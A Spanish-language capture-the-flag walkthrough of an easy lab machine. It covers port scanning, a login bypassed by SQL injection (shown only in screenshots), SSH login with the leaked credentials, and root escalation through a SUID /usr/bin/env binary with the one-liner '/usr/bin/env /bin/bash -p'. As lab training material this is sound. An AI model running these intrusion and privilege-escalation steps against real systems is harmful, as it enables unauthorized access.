# Maquina injention

- Nivel: Muy fácil

## Escaneo de puertos

<p>Tras encender la máquina lo primero que haremos será un ping para comprobar que todo esta correcto</p>

'''

ping -c1 172.17.0.2

'''

'''

PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.065 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.065/0.065/0.065/0.000 ms

'''

<p>Como podemos observar la máquina esta encendida, por el TTL se puede intuir que es una máquina Linux</p>

<p>Con esto comprobado procedemos a realizar el primer escaneo con nmap</p>

'''

sudo nmap -p- --open -sS -vvv -Pn 172.17.0.2

'''

'''

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 00:03 CET
Initiating ARP Ping Scan at 00:03
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 00:03, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:03
Completed Parallel DNS resolution of 1 host. at 00:03, 6.53s elapsed
DNS resolution of 1 IPs took 6.53s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 3, CN: 0]
Initiating SYN Stealth Scan at 00:03
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 00:03, 1.42s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000090s latency).
Scanned at 2025-02-06 00:03:29 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 8.20 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
           
'''

<p>El escaneo nos reporta que los puertos 22 y 80 estan abiertos lo cual puede ser un indicativo de que hay una página web corriendo en la máquina</p>
<p>Realizamos un segundo escaneo de esos puertos para obtener información mas detallada</p>

'''

sudo nmap -p 22,80 -sV -vvv -Pn 172.17.0.2

'''

'''

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-06 00:06 CET
NSE: Loaded 46 scripts for scanning.
Initiating ARP Ping Scan at 00:06
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 00:06, 0.03s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:06
Completed Parallel DNS resolution of 1 host. at 00:06, 6.52s elapsed
DNS resolution of 1 IPs took 6.52s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 3, CN: 0]
Initiating SYN Stealth Scan at 00:06
Scanning 172.17.0.2 [2 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 00:06, 0.02s elapsed (2 total ports)
Initiating Service scan at 00:06
Scanning 2 services on 172.17.0.2
Completed Service scan at 00:06, 6.02s elapsed (2 services on 1 host)
NSE: Script scanning 172.17.0.2.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 00:06
Completed NSE at 00:06, 0.01s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 00:06
Completed NSE at 00:06, 0.00s elapsed
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000042s latency).
Scanned at 2025-02-06 00:06:29 CET for 6s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
           
'''

<p>Este escaneo nos reporta que estamos ante una máquina Ubuntu la cual corre un Apache 2.4.52</p>




## Pagina Web

<p>Introducimos la IP de la máquina en el navegador y nos lleva a la siguiente página</p>

![captura_injection_1](https://github.com/dancs334/ciber/blob/main/capturas/Screenshot_2025-02-06_00-17-24.png)

<p>Podemos observar que es una página de inicio de sesión</p>
<p>Probamos una inyección SQL</p>

![captura_injection_2](https://github.com/dancs334/ciber/blob/main/capturas/Screenshot_2025-02-06_00-24-24.png)

<p>La página es vulnerable a SQL Injection, nos muestra el siguiente resultado </p>

![captura_injection_3](https://github.com/dancs334/ciber/blob/main/capturas/Screenshot_2025-02-06_00-26-15.png)

<p>Nos da un nombre de usuario y una contraseña</p>

## Conexión por ssh
<p>Aprovechando este nombre y contraseña tratamos de conectarnos por ssh</p>

'''

ssh dylan@172.17.0.2

'''

'''

dylan@172.17.0.2's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.8.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Feb  5 23:25:00 2025 from 172.17.0.1
dylan@7af8994eca56:~$ 

'''
<p>Ha funcionado, tenemos una conexión ssh con la máquina</p>

## Escalada de privilegios

Comprobamos que somos el usuario dylan

'''

whoami

'''

'''

dylan

'''

<p>Buscamos los programas sobre los que tenemos privilegios</p>

'''

sudo -l

'''

'''

-bash: sudo: command not found

'''

<p>Probamos otra forma de busqueda</p>

<p>Buscamos todos los archivos con permiso SUID y cuyo usuario sea root de forma que al ejecutarse lo hagan como este</p>
'''

find / -perm -4000 -user root 2>/dev/null

'''

'''

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
/usr/bin/env
/usr/bin/chfn

'''

<p>De estos archivos podemos destacar /usr/bin/env el cual se utiliza para ejecutar un programa con variables de entorno personalizadas</p>
<p>Probamos a ejecutar /bin/bash con /bin/env de forma que al cumplir con las caracteristicas mencionadas anteriormente debería devolver una bash con permisos de root</p>

'''

/usr/bin/env /bin/bash -p

'''

'''

bash-5.1# whoami
root

'''
